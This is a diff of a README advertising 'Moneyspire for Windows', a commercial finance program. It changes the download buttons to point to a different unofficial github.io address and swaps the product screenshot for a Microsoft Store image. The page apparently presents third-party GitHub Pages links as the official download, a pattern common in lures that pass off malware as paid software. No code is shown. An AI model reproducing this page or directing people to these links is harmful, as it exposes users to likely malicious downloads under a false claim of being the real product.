@@ -4,7 +4,7 @@
 
 ## 📥 Download Moneyspire for Windows
 
-[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://moneyspire-windows-download.github.io/.github)
+[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://moneyspire-desktop-app.github.io/.github/Moneyspire)
 
 ---
 
@@ -26,11 +26,11 @@ For small businesses, Moneyspire extends beyond personal finance into light busi
 
 Ultimately, Moneyspire is more than just a finance tracker—it’s a comprehensive financial command center. Whether you are paying down debt, building savings, managing a portfolio, or running a small company, it provides the tools, automation, and insights needed to manage every aspect of your financial world. By centralizing data, simplifying workflows, and empowering decision-making, Moneyspire ensures that you always have a clear picture of your financial health and the confidence to plan your future with precision.
 
-[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://moneyspire-windows-download.github.io/.github)
+[![⬇️ Download Moneyspire](https://img.shields.io/badge/Download-Moneyspire-blue?style=for-the-badge&logo=windows)](https://moneyspire-desktop-app.github.io/.github/Moneyspire)
 
 ---
 
-![Moneyspire Interface](https://www.moneyspire.com/images/2025-overview.gif)
+![Moneyspire Interface](https://store-images.s-microsoft.com/image/apps.58725.13801848630883639.51ee25b5-315b-42a1-ab93-86e5c1815163.207643f0-17a3-4b8b-bf03-a7b510a657cb)
 
 ---
 
